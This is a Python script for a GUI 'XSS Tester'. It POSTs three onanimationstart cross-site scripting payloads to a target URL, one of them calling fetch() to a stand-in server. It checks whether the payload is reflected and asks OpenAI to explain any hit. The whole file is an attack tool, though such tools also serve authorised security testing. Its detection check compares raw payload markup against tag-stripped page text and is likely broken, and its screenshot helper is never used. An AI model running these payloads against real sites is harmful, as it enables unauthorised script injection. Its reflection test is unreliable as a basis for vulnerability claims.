import requests
import tkinter as tk
from tkinter import scrolledtext
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from bs4 import BeautifulSoup
import openai
import time

# Define your OpenAI API key
openai.api_key = "YOUR_OPENAI_API_KEY"

# Define the target URL
target_url = "https://example.com/vulnerable_endpoint"

# List of onanimationstart XSS payloads
payloads = [
    # Add more payloads here, potentially fetched using web scraping methods from Wayback Machine
    '<div style="animation-name: x;" onanimationstart="alert(1)">test</div>',
    '<img style="animation-name: x;" onanimationstart="fetch(\'https://your-server.com\')">',
    '<svg style="animation-name: x;" onanimationstart="document.write(\'XSS Detected\')"></svg>'
]

# User agent to simulate mobile use
mobile_user_agent = {
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1'
}

# GUI setup using Tkinter
class XSSTesterApp:
    def __init__(self, root):
        self.root = root
        self.root.title("XSS Tester")

        # Text area to display output
        self.output = scrolledtext.ScrolledText(self.root, wrap=tk.WORD, width=100, height=20)
        self.output.grid(column=0, row=0, padx=10, pady=10)

        # Start testing button
        self.start_button = tk.Button(self.root, text="Start XSS Testing", command=self.run_tests)
        self.start_button.grid(column=0, row=1, pady=10)

    def run_tests(self):
        for payload in payloads:
            # Send a POST request with the payload
            response = requests.post(target_url, data={'input': payload}, headers=mobile_user_agent)

            # Use BeautifulSoup to parse response for vulnerability indicators
            soup = BeautifulSoup(response.text, 'html.parser')
            if payload in soup.text:
                result = f"Possible XSS vulnerability detected with payload: {payload}\n"
            else:
                result = f"Payload: {payload} did not trigger XSS\n"

            self.output.insert(tk.END, result)
            self.output.see(tk.END)
            self.root.update_idletasks()

            # Use OpenAI to generate additional insights if vulnerability is detected
            if "Possible XSS vulnerability" in result:
                self.generate_ai_analysis(payload, response.text)

    def generate_ai_analysis(self, payload, response):
        # Using OpenAI to provide context on possible vulnerability
        try:
            analysis_prompt = (
                f"The following response may contain an XSS vulnerability caused by the payload: {payload}\n"
                f"Response:\n{response}\n"
                "Explain the potential impact and possible fixes for this vulnerability."
            )
            response = openai.Completion.create(
                engine="text-davinci-003",
                prompt=analysis_prompt,
                max_tokens=150
            )
            analysis_result = f"AI Analysis: {response.choices[0].text.strip()}\n"
            self.output.insert(tk.END, analysis_result)
            self.output.see(tk.END)
            self.root.update_idletasks()
        except Exception as e:
            self.output.insert(tk.END, f"Error with OpenAI API: {str(e)}\n")
            self.output.see(tk.END)
            self.root.update_idletasks()

# Selenium setup for taking screenshots of the target page after XSS payloads are injected
def capture_screenshot(url):
    # Setup Selenium WebDriver (make sure you have the appropriate driver, e.g., ChromeDriver)
    service = Service('path/to/chromedriver')
    driver = webdriver.Chrome(service=service)
    
    try:
        driver.get(url)
        time.sleep(2)  # Let the page load

        # Take a screenshot and save it
        screenshot_path = "screenshot.png"
        driver.save_screenshot(screenshot_path)
        print(f"Screenshot saved at {screenshot_path}")

    finally:
        driver.quit()

# Main setup
if __name__ == "__main__":
    root = tk.Tk()
    app = XSSTesterApp(root)
    root.mainloop()
